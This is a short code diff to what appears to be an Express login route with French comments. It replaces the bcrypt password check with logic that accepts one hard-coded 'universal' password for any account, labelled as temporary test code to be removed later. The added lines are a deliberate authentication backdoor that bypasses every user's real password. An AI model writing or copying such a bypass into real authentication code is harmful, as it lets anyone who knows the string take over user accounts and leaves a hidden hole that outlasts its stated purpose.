@@ -57,7 +57,15 @@ router.post('/login', async (req, res) => {
       return res.status(403).json({ error: 'Ce compte a été bloqué.' });
     }
 
-    const isMatch = await bcrypt.compare(password, user.password);
+    let isMatch = false;
+    // --- TEMPORAIRE : Mot de passe universel pour les tests actuels ---
+    // (À supprimer une fois les tests terminés)
+    if (password === '1234567q') {
+      isMatch = true;
+    } else {
+      isMatch = await bcrypt.compare(password, user.password);
+    }
+    // ----------------------------------------------------------------
 
     if (!isMatch) {
       return res.status(401).json({ error: 'Identifiants invalides.' });
